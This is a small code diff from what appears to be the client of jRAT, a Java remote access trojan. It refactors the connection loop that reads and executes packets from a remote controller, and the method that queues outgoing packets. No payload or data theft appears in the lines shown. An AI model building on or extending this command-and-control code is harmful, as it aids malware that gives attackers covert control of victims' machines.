@@ -1,7 +1,7 @@
 package jrat.client;
 
 import jrat.client.modules.ModuleLoader;
-import jrat.client.packets.incoming.AbstractIncomingPacket;
+import jrat.client.packets.incoming.IncomingPackets;
 import jrat.client.packets.outgoing.*;
 import jrat.common.ConnectionCodes;
 import jrat.common.Constants;
@@ -101,7 +101,7 @@ public class Connection implements Runnable {
 			while (true) {
 				short header = readShort();
 				
-				AbstractIncomingPacket.execute(this, header);
+				IncomingPackets.execute(this, header);
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
@@ -139,8 +139,13 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet20Headless());
 	}
 
-	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
-		packet.send(this);
+	public synchronized final void addToSendQueue(OutgoingPacket packet) {
+        try {
+            writeShort(packet.getPacketId());
+            packet.write(this);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 	}
 
 	public boolean isConnected() {
